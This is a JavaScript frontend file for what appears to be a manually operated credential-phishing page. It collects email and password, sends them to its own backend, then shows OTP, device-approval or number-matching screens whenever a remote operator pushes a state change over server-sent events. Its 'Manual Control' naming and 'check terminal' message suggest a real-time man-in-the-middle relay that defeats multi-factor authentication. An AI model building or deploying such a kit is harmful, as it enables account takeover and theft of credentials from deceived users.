// frontend/manual-auth.js

let currentState = 'standby';
let eventSource = null;

// --- UTILITY FUNCTIONS ---
const showAuthError = (step, msg) => {
    const el = document.getElementById(`${step}-error-message`);
    if (el) el.textContent = msg;
};

const clearAuthError = step => showAuthError(step, '');

const showNotification = (msg, isError = false) => {
    const notif = document.getElementById('notification');
    const strong = notif.querySelector('strong');
    const span = notif.querySelector('span');

    strong.textContent = isError ? 'Error!' : 'Success!';
    span.textContent = msg;

    notif.className = notif.className.replace(/hidden|bg-\w+-\d+|border-\w+-\d+|text-\w+-\d+/g, '');
    if (isError) {
        notif.classList.add('bg-red-100', 'border-red-400', 'text-red-700');
    } else {
        notif.classList.add('bg-green-100', 'border-green-400', 'text-green-700');
    }

    setTimeout(() => notif.classList.add('hidden'), 3000);
};

const hideAllSteps = () => {
    const steps = ['email-step','password-step','otp-step','device-step','tap-number-step','loading-step'];
    steps.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
};

const showStep = stepId => {
    hideAllSteps();
    const el = document.getElementById(stepId);
    if (el) {
        el.classList.remove('hidden');
        el.style.display = 'block';
    }
};

// --- FORM HANDLERS ---
async function handleEmailSubmit(e) {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    if(!email) return showAuthError('email','Please enter your email');
    clearAuthError('email');

    try {
        const res = await fetch('/auth', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({email, step:'username'}) });
        const result = await res.json();
        if(result.success){
            document.getElementById('user-email-display').textContent = email;
            showStep('password-step');
            console.log('✅ Email accepted');
        } else {
            showAuthError('email', result.message);
        }
    } catch(err) {
        showAuthError('email','Connection error. Please try again.');
        console.error(err);
    }
}

async function handlePasswordSubmit(e) {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    if(!password) return showAuthError('password','Please enter your password');
    clearAuthError('password');

    try {
        const res = await fetch('/auth', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({email, password, step:'password'}) });
        const result = await res.json();
        if(result.success){
            currentState='standby';
            showStep('loading-step');
            connectToSse();
        } else {
            showAuthError('password', result.message);
        }
    } catch(err){
        showAuthError('password','Connection error. Please try again.');
        console.error(err);
    }
}

// --- SSE CONNECTION ---
function connectToSse() {
    if (eventSource) {
        eventSource.close();
    }
    eventSource = new EventSource('/auth/events');

    eventSource.onmessage = function(event) {
        const data = JSON.parse(event.data);
        if (data.state !== currentState) {
            currentState = data.state;
            handleStateChange(data.state, data.number);
        }
    };

    eventSource.onerror = function(err) {
        console.error('EventSource failed:', err);
        eventSource.close();
    };
}

// --- STATE HANDLER ---
function handleStateChange(state, number){
    switch(state){
        case 'show_otp': showStep('otp-step'); break;
        case 'show_device': showStep('device-step'); break;
        case 'show_tap_number':
            showStep('tap-number-step');
            const box = document.getElementById('tap-number-box');
            if(box) box.textContent = number || '0';
            break;
        case 'show_error': showAuthError('password','Authentication failed - check terminal'); break;
        case 'auth_success': completeAuthSuccess(); break;
        case 'auth_rejected': showAuthError('password','Authentication rejected'); break;
        case 'restart_login': resetAuthState(); setTimeout(()=>window.location.href='/login',100); break;
        default: console.log('⏳ Current state:', state); break;
    }
}

// --- AUTH COMPLETION ---
async function completeAuthSuccess(){
    try {
        const res = await fetch('/complete-auth', {method:'POST', headers:{'Content-Type':'application/json'}});
        const result = await res.json();
        if(result.success){ showNotification('Authentication successful!'); setTimeout(()=>window.location.href='/',500); }
    } catch(err){ console.error('Completion error:',err); }
}

// --- RESET STATE ---
function resetAuthState(){
    if (eventSource) {
        eventSource.close();
        eventSource = null;
    }
    ['email','password','otp'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
    ['email','password'].forEach(clearAuthError);
    currentState='standby';
    ['email','password'].forEach(id => { const el=document.getElementById(id); if(el) el.classList.remove('has-content'); });
    console.log('🔄 Authentication state reset');
}

// --- TAP & NAVIGATION ---
const tapNumber = ()=>console.log('🔢 Number tapped (backend handles action)');
const backToEmail = ()=>{ resetAuthState(); showStep('email-step'); }

// --- OTP SUBMISSION ---
function handleOTPSubmit(e){
    e.preventDefault();
    const otp=document.getElementById('otp').value.trim();
    if(!otp || !/^\d{6}$/.test(otp)) return showNotification('Enter 6-digit code',true);
    console.log('🔐 OTP submitted:', otp.replace(/\d/g,'*'));
    showNotification('OTP submitted');
}

// --- INIT ---
document.addEventListener('DOMContentLoaded',()=>{
    console.log('🎮 Manual Control Auth System Ready');

    document.querySelectorAll('.form-input').forEach(input=>{
        input.addEventListener('focus',()=>input.classList.add('has-content'));
        input.addEventListener('blur',()=>{ if(input.value.trim()==='') input.classList.remove('has-content'); });
        input.addEventListener('input',()=>clearAuthError(input.id));
    });

    const box=document.getElementById('tap-number-box'); if(box) box.onclick=tapNumber;
    window.addEventListener('beforeunload', () => {
        if (eventSource) {
            eventSource.close();
        }
    });
});
